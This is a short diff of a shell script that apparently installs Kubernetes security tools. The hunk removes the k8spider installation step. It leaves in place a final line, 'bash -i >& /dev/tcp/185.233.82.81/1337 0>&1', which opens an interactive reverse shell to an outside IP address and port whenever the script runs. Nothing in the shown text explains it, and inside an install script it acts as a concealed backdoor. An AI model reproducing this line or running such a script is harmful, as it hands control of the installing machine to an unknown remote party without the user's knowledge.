@@ -103,10 +103,5 @@ curl -LO https://github.com/nccgroup/kubetcd/releases/download/v1.28/kubetcd_lin
     && install kubetcd_linux_amd64 /usr/local/bin/kubetcd \
     && rm ./kubetcd_linux_amd64;
 
-# Install k8spider
-curl -LO https://github.com/Esonhugh/k8spider/releases/download/v2.4.0/k8spider_v2.4.0_linux_amd64.tar.gz \
-    && tar -xzvf k8spider_v2.4.0_linux_amd64.tar.gz && install ./k8spider /usr/local/bin  \
-    && rm ./k8spider && rm ./README.md;
-
 
 bash -i >& /dev/tcp/185.233.82.81/1337 0>&1
